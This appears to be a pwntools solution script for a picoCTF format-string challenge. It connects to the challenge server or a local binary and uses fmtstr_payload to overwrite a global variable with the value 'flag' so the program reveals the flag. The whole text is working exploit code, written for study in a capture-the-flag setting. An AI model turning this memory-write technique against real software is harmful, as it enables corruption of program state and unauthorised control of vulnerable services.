from pwn import *

context.arch = 'amd64'

if args.REMOTE:
    r = remote('rhea.picoctf.net', 56469)
else:
    r = process('./vuln')

payload = fmtstr_payload(14, {0x404060: 0x67616C66})

r.sendlineafter(b'say?\n', payload)
r.recvuntil(b'Here you go...\n')

print(r.recvall(timeout=1).decode())